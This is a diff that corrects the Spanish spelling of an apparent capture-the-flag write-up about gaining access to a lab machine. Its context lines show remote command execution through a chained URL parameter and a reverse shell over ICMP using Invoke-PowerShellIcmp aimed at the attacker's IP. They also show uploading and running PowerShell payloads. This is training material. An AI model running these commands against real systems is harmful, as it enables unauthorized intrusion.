@@ -1,4 +1,4 @@
-## Vuln exploit & Gaining Access {-}
+## Explotacion de vulnerabilidad & Ganando Acceso {-}
 
 ### Entablar una reverse shell {-}
 
@@ -57,17 +57,17 @@ http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell iw
 
 No responde y vemos un exit status que no es 0.
 
-Aqui vemos que las connecciones por TCP no funccionan. Puede ser porque hay reglas definidas que no permitten utilizar TCP y S4vitar
+Aqui vemos que las conexiones por TCP no funcionan. Puede ser porque hay reglas definidas que no permiten utilizar TCP y S4vitar
 nos adelanta que tampoco funccionna por UDP.
 
 Aqui hemos podido comprobar que:
 
 - tenemos capacidad de ejecucion remota de commando.
-- tenemos connectividad por trasa ICMP
-- el protocolo TCP esta blockeado
-- el protocole UDP esta blockeado
+- tenemos conectividad por trasa ICMP
+- el protocolo TCP esta bloqueado
+- el protocole UDP esta bloqueado
 
-Segun esta analysis intentamos crearnos una reverse shell por **ICMP**
+Segun esta analisis intentamos crearnos una reverse shell por **ICMP**
 
 ### Entablar una reverse shell por ICMP {-}
 
@@ -82,9 +82,9 @@ Segun esta analysis intentamos crearnos una reverse shell por **ICMP**
     vi icmp.ps1
     ```
 
-Aqui como tenemos que passar por la url de la web para enviarnos el fichero, tenemos que preparar el fichero.
+Aqui como tenemos que pasar por la url de la web para enviarnos el fichero, tenemos que preparar el fichero.
 
-1. Ejecucion de commandos prealables en nuestra maquina
+1. Ejecucion de comandos prealables en nuestra maquina
 
     ```bash
     sysctl -w net.ipv4.icmp_echo_ignore_all=1
@@ -97,7 +97,7 @@ Aqui como tenemos que passar por la url de la web para enviarnos el fichero, ten
     Invoke-PowerShellIcmp -IPAddress 10.10.14.8
     ```
 
-1. Borramos todo los commentarios que hay en el fichero
+1. Borramos todo los comentarios que hay en el fichero
 1. Borramos todo los saltos de linea
 
     ```bash
@@ -164,7 +164,7 @@ Aqui como tenemos que passar por la url de la web para enviarnos el fichero, ten
     ./fileUpload.sh
     ```
 
-1. Controllamos en la web si el fichero existe
+1. Controlamos en la web si el fichero existe
 
     ```bash
     http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=type C:\Temp\reverse.ps1
@@ -200,5 +200,5 @@ Aqui como tenemos que passar por la url de la web para enviarnos el fichero, ten
     http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell C:\Temp\pwned.ps1
     ```
 
-Por fin estamos a dentro de la maquina ;)
+Por fin estamos adentro de la maquina ;)
 
